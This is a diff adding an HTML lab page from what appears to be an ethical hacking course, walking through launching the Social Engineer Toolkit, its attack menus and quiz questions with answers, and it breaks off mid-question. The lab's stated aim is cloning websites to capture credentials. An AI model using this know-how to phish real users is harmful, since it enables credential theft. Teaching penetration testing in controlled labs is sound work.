@@ -1,0 +1,2196 @@
+<!DOCTYPE html><html><head>
+<style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 1rem;
+      }
+      ol,
+      ul {
+        margin-bottom: 0in;
+      }
+      table {
+        margin-top: 1rem;
+        border: 1px solid gray;
+        width: 7in;
+        border-collapse: collapse;
+      }
+
+      table > thead > tr > .openTableTextBox__table-header-data {
+        text-align: center;
+        margin-top: 6pt;
+        margin-right: 0in;
+        margin-bottom: 6pt;
+        margin-left: 0in;
+        text-align: center;
+        line-height: 115%;
+        page-break-after: avoid;
+        font-size: 10pt;
+        font-family: "Arial", sans-serif;
+        font-weight: bold;
+        background: #dbe5f1;
+        padding: 0.5rem;
+      }
+      .openTableTextBox__answerText
+        table
+        > thead
+        > tr
+        > .openTableTextBox__table-header-data {
+        background: #f2dbdb !important;
+      }
+      .openTextBox__textArea-container {
+        margin-top: 6pt;
+        margin-right: 0in;
+        margin-bottom: 6pt;
+        font-size: 10pt;
+        font-family: "Arial", sans-serif;
+        width: 50%;
+      }
+      .openTableTextBox__fieldset {
+        padding: 5px;
+      }
+      td {
+        margin-top: 3pt;
+        margin-right: 0in;
+        margin-bottom: 3pt;
+        margin-left: 0in;
+        font-size: 10pt;
+        font-family: "Arial", sans-serif;
+        width: 98.85pt;
+        border: solid windowtext 1pt;
+        border-top: none;
+        padding: 0.7pt 5.75pt 0.7pt 5.75pt;
+      }
+      textarea {
+        width: 100%;
+      }
+      .answergray {
+        padding: 0.2rem;
+      }
+
+      .openTableTextBox__widget {
+        margin-top: 6pt;
+        margin-right: 0in;
+        margin-bottom: 6pt;
+        margin-left: 0.25in;
+      }
+
+      .show-answer,
+      .hide-answer {
+        padding: 0.5rem 1rem;
+        background-color: #3d692b;
+        color: #fff;
+        border: 0px;
+        cursor: pointer;
+        margin-bottom: 0.5rem;
+        margin-top: 0.5rem;
+      }
+
+      .openTextBoxController__button-container {
+        display: flex;
+        margin-top: 1rem;
+        margin-bottom: 1rem;
+      }
+
+      .openTextBoxController__button-container .btn-text {
+        margin: 10px;
+      }
+
+      .btn-text {
+        border: 0px;
+        padding: 0.5rem 1rem;
+        background-color: #3d692b;
+        color: #fff;
+        border-radius: 0;
+        cursor: pointer;
+      }
+
+      .u-display-none {
+        display: none;
+      }
+      .openTextBox__postText, openTableTextBox__postText {
+        margin-top: 0.5rem;
+      }
+      .edit-comment {
+        display: none;
+      }
+      .js-heading-inner {
+        display: none;
+      }
+      .block__title-inner,
+      .article__title-inner {
+        display: block;
+        font-size: 1.5em;
+        margin-block-start: 0.83em;
+        margin-block-end: 0.83em;
+        margin-inline-start: 0px;
+        margin-inline-end: 0px;
+        font-weight: bold;
+      }
+      h2{
+        font-size: 1.25em;
+      }
+      h3{
+        font-size: 1.125em;
+      }
+      .table
+        > .table-inner
+        > .table-wrapper
+        > .table-widget
+        > table
+        > tbody
+        > tr
+        > th {
+        border: solid windowtext 1pt;
+      }
+      .openTableTextBox__answerText
+        table
+        > thead
+        > tr
+        > .openTableTextBox__table-header-data {
+        background: #f2dbdb !important;
+      }
+      .command-output > .table-inner > .table-wrapper > .table-widget > table,
+      .command-output
+        > .table-inner
+        > .table-wrapper
+        > .table-widget
+        > table
+        > tbody
+        > tr
+        > td,
+      .command-output
+        > .table-inner
+        > .table-wrapper
+        > .table-widget
+        > table
+        > tbody
+        > tr
+        > th {
+        border: none !important;
+        text-align: right !important;
+      }
+      .simple-table > .table-inner > .table-wrapper{
+        margin-left: 1.5rem;
+      }
+      .openTextBox__widget {
+        margin-left: 1.5rem;
+      }
+      img {
+        width: 30%;
+        height: auto;
+        margin-top: 1rem;
+        margin-left: 3rem;
+      }
+      .answergray {
+        background-color: #ccc;
+      }
+      .openTableTextBox__widget > .answergray {
+        background-color: #fff !important;
+      }
+      li > ul,ol > li{
+        margin-left: 0px !important;
+      }
+      img {
+        width: 30%;
+        height: auto;
+        margin-top: 1rem;
+        margin-left: 3rem;
+      }
+    </style>
+
+</head><body><!---->
+            <div class="article 645bd9bce870d8103c0b383e remove-top-padding remove-padding-bottom ">
+                <div class="article__inner">
+                <div class=" no-adaptive-scroll">
+                    <!--?lit$278323178$-->
+                        <div class=""> 
+                            <base-view type="article" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="article__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="article__header ">
+              <div class="article__header-inner ">
+                  
+                    <div class=" article__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bd9bce870d8103c0b383e-heading-view" headingtitle="Lab - Explore the Social Engineer Toolkit (SET)" modelid="645bd9bce870d8103c0b383e" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="article-heading" aria-level="2">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Lab - Explore the Social Engineer Toolkit (SET)</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                        <div tabindex="0" role="heading" class="article__title-inner " aria-level="2">
+                        <span class="accessibility-completion-indicator"><!--?lit$278323178$-->Incomplete </span>
+                        <!--?lit$278323178$-->Lab - Explore the Social Engineer Toolkit (SET)</div>
+                      
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                            <div class="block__container " style="">
+                                <!--?lit$278323178$--><!---->
+                                    <block-view modelid="645bd9bce870d8103c0b383f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bd9bce870d8103c0b383f" class="645bd9bce870d8103c0b383f block remove-top-padding remove-padding-bottom is-complete">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bd9bce870d8103c0b383f" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bd9bce870d8103c0b383f-heading-view" headingtitle="Introduction" modelid="645bd9bce870d8103c0b383f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-complete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Complete &nbsp;<!--?lit$278323178$-->Introduction</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645bdc9c1cdd7010682c08e5" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645bdc9c1cdd7010682c08e5" class="component text 645bdc9c1cdd7010682c08e5 remove-top-padding remove-padding-bottom is-full is-complete  ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bdc9c1cdd7010682c08e5-heading-view" headingtitle="Introduction" modelid="645bdc9c1cdd7010682c08e5" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-complete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Complete &nbsp;<!--?lit$278323178$-->Introduction</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h1>Objectives</h1><p>Many exploits begin with a social engineering attack that is designed to obtain credentials or plant malware to create entry points into the target network. One of the tools used to perform these social engineering attacks is the Social Engineer Toolkit (SET), developed by David Kennedy.</p><ul><li><!--[endif]-->Launching SET and exploring the toolkit</li><li><!--[if !supportLists]--><!--[endif]-->Cloning a website to obtain user credentials</li><li><!--[if !supportLists]--><!--[endif]-->Capturing and viewing user credentials</li></ul><h1>Background / Scenario</h1><p>In this activity, you will clone a website and obtain user credentials. This activity is performed under carefully controlled conditions within a virtual environment. SET tools should only be used for penetration testing in situations where you have written permission to perform social engineering exploits.</p><p>In an actual penetration test, this procedure could be used to reveal problems with user security training and the need take measures to educate users about various types of phishing attacks.</p><h1>Required Resources</h1><ul><li><!--[if !supportLists]--><!--[endif]-->Kali VM customized for Ethical Hacker course</li><li><!--[if !supportLists]--><!--[endif]-->Internet access</li></ul></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bdfd1af658a0c1e2808c7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bdfd1af658a0c1e2808c7" class="645bdfd1af658a0c1e2808c7 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bdfd1af658a0c1e2808c7" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bdfd1af658a0c1e2808c7-heading-view" headingtitle="Part 1 Step 1 and 2" modelid="645bdfd1af658a0c1e2808c7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1 Step 1 and 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645bdfd1af658a0c1e2808c8" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645bdfd1af658a0c1e2808c8" class="component text 645bdfd1af658a0c1e2808c8 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bdfd1af658a0c1e2808c8-heading-view" headingtitle="Part 1" modelid="645bdfd1af658a0c1e2808c8" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h1>Instructions</h1><h2 style="margin-left:0in"><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>Part 1: </span></span>[endif]-->Part 1: Launching SET and Exploring the Toolkit</h2><h3 style="margin-left:0in"><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>Step 1: </span></span>[endif]-->Step 1: Load the SET application.</h3><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>a.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span>[endif]-->Start Kali Linux using the username <strong>kali</strong> and the password <strong>kali</strong>. Open a terminal session from the menu bar at the top of the screen.</li><li><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>b.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span>[endif]-->SET must be run as root. Use the <strong>sudo -i</strong> command to obtain persistent root access. At the prompt, enter the command <strong>setoolkit</strong> to load the SET menu system. The Social Engineering Toolkit can also be run from the <strong>Applications &gt;Social Engineering Tools &gt;social engineering toolkit (root)</strong> choice on the Kali menu.</li></ol><pre style="margin-left:40px">┌──(kali<span>㉿</span>Kali)-[~]</pre><pre style="margin-left:40px">└─$ <strong>sudo -i</strong></pre><pre style="margin-left:40px">[sudo] password for kali:</pre><pre style="margin-left:40px">┌──(root<span>㉿</span>Kali)-[~]</pre><pre style="margin-left:40px">└─# <strong>setoolkit</strong></pre><p style="margin-left:40px">If this is the first time that you have run SET, the license terms and conditions are displayed, and an agreement is required. Read the terms carefully.</p><ol start="3" style="list-style-type:lower-alpha"><li><!--[if !supportLists]<span
+style='mso-comment-continuation:2'><span style='mso-fareast-font-family:Arial;
+mso-bidi-font-family:Arial'><span style='mso-list:Ignore'>c.<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span></span>[endif]--><span><span class="MsoCommentReference"><span><!--[if !supportAnnotations]<a class=msocomanchor
+id="_anchor_1" onmouseover="msoCommentShow('_anchor_1','_com_1')"
+onmouseout="msoCommentHide('_com_1')" href="./courses/content/m4/#_msocom_1" language=JavaScript
+name="_msoanchor_1">[DHX(UIaC1]</a>[endif]--><span>&nbsp;</span></span></span></span><span class="MsoCommentReference"><span><!--[if !supportAnnotations]<a class=msocomanchor
+id="_anchor_2" onmouseover="msoCommentShow('_anchor_2','_com_2')"
+onmouseout="msoCommentHide('_com_2')" href="./courses/content/m4/#_msocom_2" language=JavaScript
+name="_msoanchor_2">[MBX(UIaC2]</a>[endif]--><span></span></span></span>After reading the disclaimer, enter <strong>y</strong> to accept the terms of service.</li></ol><pre style="margin-left:40px"><strong>The Social-Engineer Toolkit is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool for lawful purposes only.</strong></pre><pre style="margin-left:40px">Do you agree to the terms of service [y/n]: <strong>y</strong></pre><p style="margin-left:40px"><span>The initial SET menu is displayed, as shown:</span></p><pre style="margin-left: 40px;">&nbsp;</pre><pre style="margin-left:40px"><span>   The Social-Engineer Toolkit is a product of TrustedSec.</span></pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"> <span><span>           </span>Visit: <span>https://www.trustedsec.com</span></span> </pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"><span>   </span>It's easy to update using the PenTesters Framework! (PTF)</pre><pre style="margin-left:40px">&nbsp;Visit https://github.com/trustedsec/ptf to update all your tools!</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px">Select from the menu:</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"><span>   </span>1) Social-Engineering Attacks</pre><pre style="margin-left:40px"><span>   </span>2) Penetration Testing (Fast-Track)</pre><pre style="margin-left:40px"><span>   </span>3) Third Party Modules</pre><pre style="margin-left:40px"><span>   </span>4) Update the Social-Engineer Toolkit</pre><pre style="margin-left:40px"><span>   </span>5) Update SET configuration</pre><pre style="margin-left:40px"><span>   </span>6) Help, Credits, and About</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"><span>  </span>99) Exit the Social-Engineer Toolkit</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px">set&gt;</pre><h3 style="margin-left:0in"><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>Step 2: </span></span>[endif]-->Step 2: Examine the Available Social-Engineering Attacks.</h3><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>a.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span>[endif]-->At the SET prompt, enter <strong>1</strong> and press <strong>Enter</strong> to access the Social-Engineering Attacks submenu.</li></ol><pre style="margin-left:40px">set&gt; <strong>1</strong></pre><pre style="margin-left:40px">Select from the menu:</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"><span>   </span>1) Spear-Phishing Attack Vectors</pre><pre style="margin-left:40px"><span>   </span>2) Website Attack Vectors</pre><pre style="margin-left:40px"><span>   </span>3) Infectious Media Generator</pre><pre style="margin-left:40px"><span>   </span>4) Create a Payload and Listener</pre><pre style="margin-left:40px"><span>   </span>5) Mass Mailer Attack</pre><pre style="margin-left:40px"><span>   </span>6) Arduino-Based Attack Vector</pre><pre style="margin-left:40px"><span>   </span>7) Wireless Access Point Attack Vector</pre><pre style="margin-left:40px"><span>   </span>8) QRCode Generator Attack Vector</pre><pre style="margin-left:40px"><span>   </span>9) Powershell Attack Vectors</pre><pre style="margin-left:40px"><span>  </span>10) Third Party Modules</pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px"><span>  </span>99) Return back to the main menu.</pre><ol start="2" style="list-style-type:lower-alpha"><li><!--[if !supportLists]<span
+style='mso-fareast-font-family:Arial;mso-bidi-font-family:Arial'><span
+style='mso-list:Ignore'>b.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span>[endif]-->Select each option to see a brief description of each exploit and what the tool does for each.</li></ol><p style="margin-left:40px"><strong>Note</strong>: Some options may not have a choice. In that case, use <strong>CTRL-C</strong> or enter <strong>99 </strong>to return to the main menu.</p></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bea2b0bbb8e0fca7afcd8" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bea2b0bbb8e0fca7afcd8" class="645bea2b0bbb8e0fca7afcd8 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bea2b0bbb8e0fca7afcd8" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bea2b0bbb8e0fca7afcd8-heading-view" headingtitle="Part 1 Step 2" modelid="645bea2b0bbb8e0fca7afcd8" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645bed4b0bbb8e0fca7afcda" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645bed4b0bbb8e0fca7afcda" class="component opentextbox 645bed4b0bbb8e0fca7afcda remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645bed4b0bbb8e0fca7afcda" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bed4b0bbb8e0fca7afcda-heading-view" headingtitle="Which option creates a DVD or USB thumb drive that will autorun malicious software when inserted into the target device?" modelid="645bed4b0bbb8e0fca7afcda" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Which option creates a DVD or USB thumb drive that will autorun malicious software when inserted into the target device?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->Which option creates a DVD or USB thumb drive that will autorun malicious software when inserted into the target device?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->3) Infectious Media Generator
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bee480bbb8e0fca7afcdc" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bee480bbb8e0fca7afcdc" class="645bee480bbb8e0fca7afcdc block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bee480bbb8e0fca7afcdc" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bee480bbb8e0fca7afcdc-heading-view" headingtitle="Part 1 Step 2" modelid="645bee480bbb8e0fca7afcdc" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645bee480bbb8e0fca7afcdd" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645bee480bbb8e0fca7afcdd" class="component opentextbox 645bee480bbb8e0fca7afcdd remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645bee480bbb8e0fca7afcdd" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bee480bbb8e0fca7afcdd-heading-view" headingtitle="How could this functionality be used in a penetration test?" modelid="645bee480bbb8e0fca7afcdd" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->How could this functionality be used in a penetration test?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->How could this functionality be used in a penetration test?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
